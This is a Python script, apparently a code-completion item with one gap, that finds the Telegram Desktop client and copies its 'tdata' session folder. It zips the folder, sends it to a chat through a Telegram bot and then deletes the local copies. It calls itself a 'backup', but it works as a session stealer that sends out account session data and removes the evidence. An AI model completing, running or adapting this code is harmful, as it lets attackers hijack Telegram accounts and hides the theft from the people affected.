import os
import shutil
import zipfile
import subprocess
import telebot
from pathlib import Path

# Function to find the path of the Telegram client
def find_telegram_path():
        # Using psutil to find the process and its path
    <FILL_HERE>
# Function to copy tdata directory
def copy_tdata_directory(telegram_path, destination):
    tdata_path = os.path.join(telegram_path, 'tdata')
    if os.path.exists(tdata_path):
        shutil.copytree(tdata_path, destination, dirs_exist_ok=True)
        print(f"Copied tdata directory to {destination}")
    else:
        print("tdata directory not found")

# Function to compress the directory into a zip file
def compress_directory(directory, output_zip):
    with zipfile.ZipFile(output_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(directory):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, directory)
                zipf.write(file_path, arcname)
    print(f"Compressed {directory} into {output_zip}")

# Function to send the zip file via Telegram
def send_telegram_message(chat_id, file_path, token):
    bot = telebot.TeleBot(token)
    with open(file_path, 'rb') as file:
        bot.send_document(chat_id, file)
    print(f"Sent {file_path} to Telegram user")

# Function to delete the local compressed file and directory
def delete_local_files(directory, file_path):
    shutil.rmtree(directory)
    os.remove(file_path)
    print(f"Deleted local directory {directory} and file {file_path}")

# Main function to orchestrate the backup process
def main(telegram_token, chat_id):
    telegram_path = find_telegram_path()
    if not telegram_path:
        print("Telegram path not found")
        return

    local_tdata_dir = 'tdata'
    compressed_file = 'tdata.zip'

    copy_tdata_directory(telegram_path, local_tdata_dir)
    compress_directory(local_tdata_dir, compressed_file)
    send_telegram_message(chat_id, compressed_file, telegram_token)
    delete_local_files(local_tdata_dir, compressed_file)

if __name__ == "__main__":
    TELEGRAM_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'
    CHAT_ID = 'YOUR_CHAT_ID'
    main(TELEGRAM_TOKEN, CHAT_ID)